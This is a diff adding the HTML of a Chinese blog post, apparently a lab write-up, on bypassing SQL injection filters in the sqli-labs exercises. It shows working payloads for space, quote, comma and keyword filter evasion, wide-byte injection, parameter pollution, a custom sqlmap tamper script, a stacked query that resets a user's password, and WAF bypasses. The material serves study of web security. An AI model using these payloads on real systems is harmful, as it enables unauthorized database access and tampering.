@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>三十，SQL注入绕过 | Hexo</title>
+  <meta name="description" content="目录： &emsp;&emsp;1，绕过空格 (注释符&#x2F;* *&#x2F;，%a0)        &emsp;&emsp;2，引号绕过(使用十六进制)        &emsp;&emsp;3，逗号绕过(使用from或者offset)        &emsp;&emsp;4，or and xor not绕过        &emsp;&emsp;5，绕过注释符号 (#，–(后面跟一个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="三十，SQL注入绕过">
+<meta property="og:url" content="http://example.com/2023/12/28/%E4%B8%89%E5%8D%81%EF%BC%8CSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="baiQstar的博客">
+<meta property="og:description" content="目录： &emsp;&emsp;1，绕过空格 (注释符&#x2F;* *&#x2F;，%a0)        &emsp;&emsp;2，引号绕过(使用十六进制)        &emsp;&emsp;3，逗号绕过(使用from或者offset)        &emsp;&emsp;4，or and xor not绕过        &emsp;&emsp;5，绕过注释符号 (#，–(后面跟一个">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282025144.jpeg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282035570.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282043660.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282044818.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282112784.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282118151.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282121196.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282137417.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282138940.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282141771.png">
+<meta property="article:published_time" content="2023-12-28T11:41:08.000Z">
+<meta property="article:modified_time" content="2023-12-28T13:56:26.045Z">
+<meta property="article:author" content="白易安">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282025144.jpeg">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://example.com/2023/12/28/%E4%B8%89%E5%8D%81%EF%BC%8CSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="baiQstar的博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/baiQstar" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">白易安</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">往事如叶，飘散随风</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Shenzhen, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">项目</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">书单</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/baiQstar" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/cofess" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+
+    
+      
+
+    
+      
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">十二月 2023</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">十一月 2023</a><span class="archive-list-count">22</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2023/12/28/%E4%B8%89%E5%8D%81%EF%BC%8CSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/" class="title">三十，SQL注入绕过</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-12-28T11:41:08.000Z" itemprop="datePublished">2023-12-28</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2023/12/21/%E4%BA%8C%E5%8D%81%E4%B9%9D%EF%BC%8CSQL%E6%B3%A8%E5%85%A5/" class="title">二十九，SQL注入</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-12-21T11:08:56.000Z" itemprop="datePublished">2023-12-21</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2023/12/17/%E4%BA%8C%E5%8D%81%E5%85%AB%EF%BC%8Chtml%E5%BC%95%E7%94%A8Element2/" class="title">二十八，html引用Element2</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-12-17T01:37:52.000Z" itemprop="datePublished">2023-12-17</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2023/12/11/%E4%BA%8C%E5%8D%81%E4%B8%83%EF%BC%8Cpython%E7%88%AC%E8%99%AB-VIP%E8%A7%86%E9%A2%91%E8%A7%A3%E6%9E%90%E5%99%A8/" class="title">二十七，python爬虫-VIP视频解析器</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-12-11T13:48:34.000Z" itemprop="datePublished">2023-12-11</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2023/12/11/%E4%BA%8C%E5%8D%81%E5%85%AD%EF%BC%8CVUE%E7%9A%84%E4%BD%BF%E7%94%A8/" class="title">二十六，VUE的使用</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-12-11T13:33:05.000Z" itemprop="datePublished">2023-12-11</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-三十，SQL注入绕过" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      三十，SQL注入绕过
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2023/12/28/%E4%B8%89%E5%8D%81%EF%BC%8CSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/" class="article-date">
+	  <time datetime="2023-12-28T11:41:08.000Z" itemprop="datePublished">2023-12-28</time>
+	</a>
+</span>
+        
+        
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/12/28/%E4%B8%89%E5%8D%81%EF%BC%8CSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/#comments" class="article-comment-link">评论</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <p><strong>目录：</strong></p>
+<p>&emsp;<strong>&emsp;1，绕过空格 (注释符&#x2F;* *&#x2F;，%a0)</strong><br>        <strong>&emsp;&emsp;2，引号绕过(使用十六进制)</strong><br>        <strong>&emsp;&emsp;3，逗号绕过(使用from或者offset)</strong><br>        <strong>&emsp;&emsp;4，or and xor not绕过</strong><br>        <strong>&emsp;&emsp;5，绕过注释符号 (#，–(后面跟一个空格) ) 过滤</strong><br>        <strong>&emsp;&emsp;6，绕过union，select，where等</strong><br>        <strong>&emsp;&emsp;7，宽字节注入</strong><br>        <strong>&emsp;&emsp;8，多参数请求拆分</strong><br>        <strong>&emsp;&emsp;9，HTTP参数污染</strong><br>        <strong>&emsp;&emsp;10，编写使用tamper</strong><br>        <strong>&emsp;&emsp;11，堆叠注入</strong><br>        &emsp;&emsp;<strong>12，绕过waf</strong></p>
+<p>在做sqli关卡时，会遇到各种各样的限制，如禁止使用and,or,#注释等等，对此若想继续进行SQL注入，则需使用以下方法来绕过这些限制。</p>
+<h4><span id="1绕过空格注释符x2f-x2fa0">1，绕过空格（注释符&#x2F;* *&#x2F;，%a0）</span></h4><p>两个空格代替一个空格，用Tab代替空格，%a0&#x3D;空格：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/ （）</span><br></pre></td></tr></table></figure>
+
+<p>最基本的绕过方法，用注释替换空格：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/* 注释 */</span><br><span class="line"></span><br><span class="line">/**/表示注释</span><br><span class="line">/*!*/表示在!后还能加入sql语句并执行，只能执行sql版本号支持的sql语句</span><br></pre></td></tr></table></figure>
+
+<p>例如27a关禁用空格，用%0a来代替，布尔盲注代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paramsGet = url+ <span class="string">&#x27;%0aand%0aascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%0a and&quot;1&quot;=&quot;1&#x27;</span>.<span class="built_in">format</span>(i,tmp)</span><br></pre></td></tr></table></figure>
+
+<p>26a用（）来代替空格，布尔盲注代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paramsGet = url+ <span class="string">&quot;anandd(ascii(substr((select (group_concat(table_name) ) from (infoorrmation_schema.tables) where (table_schema=database())),&#123;0&#125;,1))&gt;&#123;1&#125;)anandd&#x27;1&#x27;=&#x27;1&quot;</span>.<span class="built_in">format</span>(i,tmp)</span><br></pre></td></tr></table></figure>
+
+
+
+<h4><span id="2引号绕过使用十六进制">2，引号绕过（使用十六进制）</span></h4><p>若禁用了双引号“，但我们在以下查询指定表的字段时需要用的双引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name)  from information_schema.columns where table_name=&quot;users&quot; and table_schema=database();</span><br></pre></td></tr></table></figure>
+
+<p>遇到这样的问题就要使用十六进制来处理这个问题了。users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name)  from information_schema.columns where table_name=0x7573657273 and table_schema=database();</span><br></pre></td></tr></table></figure>
+
+
+
+<h4><span id="3逗号绕过使用from或者offset">3，逗号绕过（使用from或者offset）</span></h4><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(database() from 1 for 1);</span><br><span class="line">select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure>
+
+<p>使用join：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2     #等价于</span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br></pre></td></tr></table></figure>
+
+<p>使用like：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))=80   #等价于</span><br><span class="line">select user() like &#x27;r%&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>对于limit可以使用offset来绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from news limit 0,1    #等价于</span><br><span class="line">select * from news limit 1 offset 0</span><br></pre></td></tr></table></figure>
+
+
+
+<h4><span id="4or-and-xor-not绕过">4，or and xor not绕过</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and=&amp;&amp;  or=||   xor=|   not=!</span><br><span class="line">如果是有以上字符则删除再执行，则使用双写或部分大写部分小写绕过</span><br><span class="line">and=anandd    or=oorr</span><br></pre></td></tr></table></figure>
+
+
+
+<h4><span id="5绕过注释符号后面跟一个空格过滤">5,绕过注释符号（#，–(后面跟一个空格））过滤</span></h4><p>以单引号‘闭合为例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,3||&#x27;1</span><br><span class="line">and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+
+
+<h4><span id="6绕过unionselectwhere等">6，绕过union，select，where等</span></h4><p><strong>（1）使用注释符绕过</strong></p>
+<p>常用注释符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//，-- , /**/, #, --+, -- -, ;,%00,--a</span><br></pre></td></tr></table></figure>
+
+<p>用法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user</span><br></pre></td></tr></table></figure>
+
+<p><strong>（2）使用大小写绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;UnIoN/**/SeLeCT</span><br></pre></td></tr></table></figure>
+
+<p><strong>（3）内联注释绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span><br></pre></td></tr></table></figure>
+
+<p><strong>（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;UNIunionONSeLselectECT1,2,3–-</span><br></pre></td></tr></table></figure>
+
+
+
+<h4><span id="7宽字节注入">7，.宽字节注入</span></h4><p>过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 ‘ 。在 mysql 中使用 GBK  编码的时候，会认为两个字符为一个汉字，一般用%df 吃掉 \ ，具体的方法是 urlencode(‘) &#x3D; %5c%27，我们在  %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c  就是一个汉字，%27 作为一个单独的（’）符号在外面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1%df%27union select 1,user(),3--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h4><span id="8多参数请求拆分">8，多参数请求拆分</span></h4><p>对于多个参数拼接到同一条SQL语句中的情况，可以将注入语句分割插入。</p>
+<p>例如请求URL时，GET参数格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=[input1]&amp;b=[input2]</span><br></pre></td></tr></table></figure>
+
+<p>将GET的参数a和参数b拼接到SQL语句中，SQL语句如下所示。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and a=[input1] and b=[input2]</span><br></pre></td></tr></table></figure>
+
+<p>这时就可以将注入语句进行拆分，如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=union/*&amp;b=*/select 1,2,3,4</span><br></pre></td></tr></table></figure>
+
+<p>最终将参数a和参数b拼接，得到的SQL语句如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and a=union /*and b=*/select 1,2,3,4</span><br></pre></td></tr></table></figure>
+
+
+
+<h4><span id="9http参数污染">9，HTTP参数污染</span></h4><p>HTTP参数污染是指当同一个参数出现多次，不同的中间件会解析为不同的结果。具体如下图所示：（以参数color&#x3D;red&amp;color&#x3D;blue为例）。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282025144.jpeg" alt="img"></p>
+<p>例如29关，就只拿到最后以为参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.55:808/sqli/Less-29/?id=1&amp;id=-1&#x27; union select 1,database(),3 and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+
+
+<h4><span id="10编写使用tamper">10，编写使用tamper</span></h4><p>在做26a关时禁用了and,or,空格和注释，所有直接使用SQLmap是爆不出数据库的，所以就要使用tamper</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    payload = payload.lower()</span><br><span class="line">    payload = payload.replace(&#x27;and&#x27;, &#x27;anandd&#x27;)</span><br><span class="line">    payload = payload.replace(&#x27;or&#x27;, &#x27;oorr&#x27;)</span><br><span class="line">    payload = payload.replace(&#x27; &#x27;, &#x27;%0B&#x27;)</span><br><span class="line">    payload = payload.replace(&quot;#&quot;, &quot;anandd&#x27;1&#x27;=&#x27;1&quot;)</span><br><span class="line">    return payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>以上是自己编写的tamper名为sx.py作用是将SQLmap爆库时的语句中被禁用的字符替换为可用的</p>
+<p>将sx.py放入Kali的&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F;目录下</p>
+<p>使用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.2.99:808/sqli/Less-26a/?id=1&quot; --batch -v 3 -- tamper=sx --dbs --level=5 --risk=3</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282035570.png" alt="image-20231228203552469"></p>
+<h4><span id="11堆叠注入">11，堆叠注入</span></h4><p>存在条件：</p>
+<p>1，目标存在sql注入漏洞</p>
+<p>2，目标未对”;”号进行过滤</p>
+<p>3，目标中间层查询数据库信息时可同时执行多条sql语句，例如php中mysqli_multi_query()函数</p>
+<p>在38关，传入单引号报错,发现错误回显分析后构造单引号闭合发现字符型注入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282043660.png" alt="image-20231228204222976"></p>
+<p>经过测试存在union联合注入,使用联合注入爆破出users表中有id、username、password三个 字段.于是尝试堆叠注入将id为1的用户密码改成123,可以配合联合查询来判断sql是否执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-38/?id=-1%27%20union%20select%201,2,3;update%20users%20set%20password=123%20where%20id=1--+</span><br></pre></td></tr></table></figure>
+
+<p>再次查询</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282044818.png" alt="image-20231228204329837"></p>
+<p>已经更改，我们打开php源代码看一下，可以看到有mysqli_multi_query()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">if (mysqli_multi_query($con1, $sql))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    /* store first result set */</span><br><span class="line">    if ($result = mysqli_store_result($con1))</span><br><span class="line">    &#123;</span><br><span class="line">        if($row = mysqli_fetch_row($result))</span><br><span class="line">        &#123;</span><br><span class="line">            echo &#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;;	</span><br><span class="line">            printf(&quot;Your Username is : %s&quot;, $row[1]);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            printf(&quot;Your Password is : %s&quot;, $row[2]);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">//            mysqli_free_result($result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4><span id="12绕过waf">12，绕过waf</span></h4><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282112784.png" alt="image-20231228211209170"></p>
+<p>说明waf已开启</p>
+<p>使用yakit判断该waf拦截哪些字符，插入字典，进行执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282118151.png" alt="image-20231228211842979"></p>
+<p>观察响应的数据包大小，发现order by 和union select两组被waf拦截</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282121196.png" alt="image-20231228212141674"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用/*//*/来代替空格</span><br><span class="line">用/*！版本号*/来包裹关键字</span><br><span class="line">在mysq中 /*!*/ 不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在 /*!*/ 中，这样这些语句如果在其他数据库中是不会被执行，但在mysal中它会执行。如下语/*!50001 select from test*/这里的50001表示假如 数据库是5.00.01及以上版本，该语句才会被执行。</span><br></pre></td></tr></table></figure>
+
+<p>我们用yakit来测试可用的版本号</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282137417.png" alt="image-20231228213722369"></p>
+<p>最后拼合语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.99:8081/sqli/Less-1/?id=0&#x27;/*//*/union/*//*//*!00044select*/1,2,3-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282138940.png" alt="image-20231228213827427"></p>
+<p>查数据库，语句为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.99:8081/sqli/Less-1/?id=0&#x27;/*//*/union/*//*//*!00044select*/1,/*!00044database*//*//*//*!00044()*/,3-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282141771.png" alt="image-20231228214106412"></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
